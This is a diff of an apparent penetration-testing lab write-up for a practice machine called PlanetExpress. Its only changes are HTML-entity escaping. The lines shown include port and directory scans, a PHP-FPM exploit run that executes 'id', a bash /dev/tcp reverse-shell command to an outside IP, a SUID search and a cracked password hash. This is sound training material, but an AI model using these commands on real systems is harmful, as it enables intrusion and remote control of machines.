@@ -22,7 +22,7 @@ Nmap scan report for 192.168.176.205
 Host is up (0.40s latency).
 Not shown: 997 filtered tcp ports (no-response)
 PORT     STATE SERVICE     VERSION
-22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)
 80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
 9000/tcp open  cslistener?
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
@@ -52,12 +52,12 @@ Target: http://192.168.176.205/
 
 [14:40:24] Starting: 
 [14:40:29] 200 -  111B  - /.gitignore                                      
-[14:40:37] 301 -  319B  - /assets  ->  http://192.168.176.205/assets/        
-[14:40:38] 301 -  319B  - /config  ->  http://192.168.176.205/config/        
-[14:40:39] 301 -  320B  - /content  ->  http://192.168.176.205/content/      
+[14:40:37] 301 -  319B  - /assets  -&gt;  http://192.168.176.205/assets/        
+[14:40:38] 301 -  319B  - /config  -&gt;  http://192.168.176.205/config/        
+[14:40:39] 301 -  320B  - /content  -&gt;  http://192.168.176.205/content/      
 [14:40:41] 200 -    5KB - /index.php/login/                                  
 [14:40:41] 200 -    5KB - /index.php                                         
-[14:40:46] 301 -  320B  - /plugins  ->  http://192.168.176.205/plugins/      
+[14:40:46] 301 -  320B  - /plugins  -&gt;  http://192.168.176.205/plugins/      
 [14:40:50] 200 -    0B  - /vendor/composer/autoload_psr4.php                 
 [14:40:50] 200 -   23KB - /vendor/composer/installed.json                    
 [14:40:50] 200 -    0B  - /vendor/composer/autoload_real.php                 
@@ -66,7 +66,7 @@ Target: http://192.168.176.205/
 [14:40:50] 200 -    0B  - /vendor/composer/autoload_namespaces.php           
 [14:40:50] 200 -    0B  - /vendor/composer/autoload_static.php
 [14:40:50] 200 -    1KB - /vendor/composer/LICENSE                           
-[14:40:51] 301 -  319B  - /themes  ->  http://192.168.176.205/themes/        
+[14:40:51] 301 -  319B  - /themes  -&gt;  http://192.168.176.205/themes/        
 [14:40:53] 200 -    0B  - /vendor/composer/ClassLoader.php                   
 [14:40:53] 200 -    0B  - /vendor/composer/autoload_classmap.php             
                                                                              
@@ -103,7 +103,7 @@ Task Completed
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
-└─$ curl "http://192.168.176.205/config/config.yml"
+└─$ curl &#34;http://192.168.176.205/config/config.yml&#34;
 ……
 ## 
 # Self developed plugin for PlanetExpress
@@ -112,7 +112,7 @@ Task Completed
 #  enabled: true 
                                                                                                      
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
-└─$ curl "http://192.168.176.205/config/.gitignore"
+└─$ curl &#34;http://192.168.176.205/config/.gitignore&#34;
 # This file is meant to be empty
                                  
 ```
@@ -145,17 +145,17 @@ disable_functions	system,exec,shell_exec,pcntl_alarm,pcntl_fork,pcntl_waitpid,pc
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
-└─$ python3 fpm.py 192.168.244.205 "/var/www/html/planetexpress/index.php" -c '<?php passthru("id"); ?>' | head     
+└─$ python3 fpm.py 192.168.244.205 &#34;/var/www/html/planetexpress/index.php&#34; -c &#39;&lt;?php passthru(&#34;id&#34;); ?&gt;&#39; | head     
 Content-type: text/html; charset=UTF-8
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-<!DOCTYPE html>
-<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
-<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
-<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
-<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
-        <head>
-        <meta charset="utf-8">
+&lt;!DOCTYPE html&gt;
+&lt;!--[if lt IE 7]&gt;      &lt;html class=&#34;no-js lt-ie9 lt-ie8 lt-ie7&#34;&gt; &lt;![endif]--&gt;
+&lt;!--[if IE 7]&gt;         &lt;html class=&#34;no-js lt-ie9 lt-ie8&#34;&gt; &lt;![endif]--&gt;
+&lt;!--[if IE 8]&gt;         &lt;html class=&#34;no-js lt-ie9&#34;&gt; &lt;![endif]--&gt;
+&lt;!--[if gt IE 8]&gt;&lt;!--&gt; &lt;html class=&#34;no-js&#34;&gt; &lt;!--&lt;![endif]--&gt;
+        &lt;head&gt;
+        &lt;meta charset=&#34;utf-8&#34;&gt;
 ```
 
 
@@ -166,7 +166,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ```shell
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
-└─$ python3 fpm.py 192.168.244.205 "/var/www/html/planetexpress/index.php" -c '<?php passthru("bash -c \"bash -i >& /dev/tcp/192.168.45.203/80 0>&1\""); ?>' | head
+└─$ python3 fpm.py 192.168.244.205 &#34;/var/www/html/planetexpress/index.php&#34; -c &#39;&lt;?php passthru(&#34;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/192.168.45.203/80 0&gt;&amp;1\&#34;&#34;); ?&gt;&#39; | head
 ```
 
 
@@ -178,8 +178,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ## PE
 
 ```sh
-www-data@planetexpress:~$ find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
-< / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
+www-data@planetexpress:~$ find / -perm -u=s -type f -exec ls -l {} \; 2&gt;/dev/null
+&lt; / -perm -u=s -type f -exec ls -l {} \; 2&gt;/dev/null
 -rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 -rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
 -rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
@@ -272,10 +272,10 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 2 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
 neverwant2saygoodbye (?)     
 1g 0:00:14:10 DONE (2023-12-20 02:21) 0.001176g/s 990.2p/s 990.2c/s 990.2C/s newbattle..nevada99
-Use the "--show" option to display all of the cracked passwords reliably
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
